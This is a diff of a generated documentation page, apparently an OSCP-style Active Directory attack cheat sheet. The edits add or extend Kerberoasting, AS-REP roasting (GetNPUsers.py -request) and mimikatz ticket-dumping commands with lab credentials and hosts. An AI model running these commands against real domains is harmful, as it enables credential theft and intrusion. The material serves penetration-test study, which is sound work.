@@ -25,7 +25,7 @@
       
       
       <link rel="icon" href="../img/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.4">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
@@ -29108,7 +29108,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-2-24">24</a></span>
 <span class="normal"><a href="#__codelineno-2-25">25</a></span>
 <span class="normal"><a href="#__codelineno-2-26">26</a></span>
-<span class="normal"><a href="#__codelineno-2-27">27</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>########################################
+<span class="normal"><a href="#__codelineno-2-27">27</a></span>
+<span class="normal"><a href="#__codelineno-2-28">28</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>########################################
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a># Enumerate SPNs (Kerberoast targets)
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>########################################
 </span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
@@ -29135,6 +29136,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25"></a># Example
 </span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26"></a>impacket-GetUserSPNs corp.com/pete:MattLovesAutumn1
 </span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27"></a>Get-DomainSPNTicket -SPN http/files04.corp.com
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28"></a>Get-DomainSPNTicket -SPN HTTP/MS01.oscp.exam
 </span></code></pre></div></td></tr></table></div>
 <h2 id="kerberoasting-tgs-rep">Kerberoasting TGS-rep</h2>
 <p>Kerberoasting is an Active Directory attack technique where any authenticated domain user can request a service ticket (TGS) for accounts that have Service Principal Names (SPNs). The ticket is encrypted using the service account's password hash. The attacker can extract this encrypted blob and brute-force it offline to recover the password.</p>
@@ -29619,10 +29621,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a># AS-REP Roasting
 </span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a>########################################
 </span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a># Impacket. From kali
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5"></a>GetNPUsers.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;password&gt; -usersfile users.txt -format hashcat
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5"></a>GetNPUsers.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;password&gt; -usersfile users.txt -format hashcat -request
 </span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6"></a>
 </span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7"></a># Example
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8"></a>GetNPUsers.py corp.com/pete:MattLovesAutumn1 -usersfile users.txt -dc-ip 192.168.185.70 -format hashcat
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8"></a>GetNPUsers.py corp.com/pete:MattLovesAutumn1 -usersfile users.txt -dc-ip 192.168.185.70 -format hashcat -request
 </span></code></pre></div></td></tr></table></div>
 <p>Crack as-rep roasted TGT ticket:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1"> 1</a></span>
@@ -29697,7 +29699,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a># Pass-the-Ticket (Kerberos ticket reuse)
 </span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>########################################  
 </span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a># List kerberos tickets currently loadedand dump them  
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a>.\mimikatz.exe &quot;kerberos::list /dump&quot; &quot;exit&quot;  
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a>.\mimikatz.exe &quot;token::elevate&quot; &quot;kerberos::list /dump&quot; &quot;exit&quot;  
 </span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6"></a>
 </span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7"></a># BASIC: Inject a kerberos ticket into the current session. Below more examples with different hashes.
 </span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8"></a>.\mimikatz.exe &quot;kerberos::ptt &lt;TGT_ticket.kirbi&gt;&quot; &quot;exit&quot;
@@ -30286,7 +30288,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 7, 2026 21:02:17 UTC"><span class="timeago" datetime="2026-03-07T21:02:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 7, 2026 21:02:17 UTC">2026-03-07</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 20, 2026 15:28:12 UTC"><span class="timeago" datetime="2026-03-20T15:28:12+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 20, 2026 15:28:12 UTC">2026-03-20</span></small></br>
 
 
     <small>Created: March 7, 2026 21:02:17</small>
